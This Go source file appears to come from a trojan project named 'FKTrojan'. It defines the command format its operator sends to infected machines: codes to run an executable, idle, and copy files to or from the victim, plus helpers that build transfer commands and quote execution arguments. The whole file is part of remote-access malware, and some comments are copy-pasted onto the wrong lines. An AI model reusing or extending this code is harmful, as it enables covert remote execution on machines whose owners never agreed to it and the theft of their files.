package dao

import (
	"FKTrojan/common"
	"encoding/json"
	"fmt"
	"time"
)

type CommandCode int
type Command struct {
	Code        CommandCode `json:"code"`
	CommandID   int         `json:"id, omitempty"`
	IntervalSec int         `json:"interval_sec"`
	RunCount    int         `json:"run_count"`
	UID         string      `json:"guid"`
	Time        time.Time   `json:"time"`
	Parameters  []string    `json:"para"`
	Path        string      `json:"path, omitempty"`
	Md5sum      string      `json:"md5sum, omitempty"`
}

// 如下的const与SupportCMDCode一一对应
const (
	CMD_RUN_EXE CommandCode = iota
	CMD_IDLE
	CMD_TRANS_S_TO_C
	CMD_TRANS_C_TO_S
)

func (c *Command) String() string {
	b, _ := json.MarshalIndent(c, " ", " ")
	return string(b)
}
func (c *Command) Hash() string {
	return common.Md5Hash(c.String())
}

func IdleCommand(uid string) *Command {
	var cmd Command
	cmd.Time = time.Now()
	cmd.CommandID = 0
	cmd.UID = uid
	cmd.Code = CMD_IDLE
	cmd.Parameters = []string{"10"} // 10 means sleep 10s if get idle
	return &cmd
}

func TestTransferCmd(uid string) *Command {
	var cmd Command
	cmd.Time = time.Now()
	cmd.CommandID = 0
	cmd.UID = uid
	cmd.Code = CMD_TRANS_S_TO_C
	cmd.Parameters = []string{"d:\\bin\\command_tools.zip", "d:\\bin\\command_tools1.zip"} // 10 means sleep 10s if get idle
	return &cmd
}
func TestTransferCmdPositive(uid string) *Command {
	var cmd Command
	cmd.Time = time.Now()
	cmd.CommandID = 0
	cmd.UID = uid
	cmd.Code = CMD_TRANS_C_TO_S
	cmd.Parameters = []string{"d:\\bin\\command_tools2.zip", "d:\\bin\\command_tools1.zip"} // 10 means sleep 10s if get idle
	return &cmd
}

func (cmd *Command) StandardCmd() string {
	if cmd.Code != CMD_RUN_EXE {
		return ""
	}
	retStr := ""
	for _, p := range cmd.Parameters {
		if p[0] == '"' || p[0] == '\'' {
			retStr += fmt.Sprintf("%s ", p)
		} else {
			retStr += fmt.Sprintf("\"%s\" ", p)
		}
	}
	return retStr
}
func (cmd *Command) GetPath() (serverPath, clientPath string, err error) {
	if cmd.Code != CMD_TRANS_C_TO_S &&
		cmd.Code != CMD_TRANS_S_TO_C {
		err = fmt.Errorf("%s cmd is not transfer command", cmd.Code)
		return
	}
	if len(cmd.Parameters) < 2 {
		err = fmt.Errorf("parameters not valid %v", cmd.Parameters)
		return
	}
	serverPath = cmd.Parameters[0]
	clientPath = cmd.Parameters[1]
	return
}
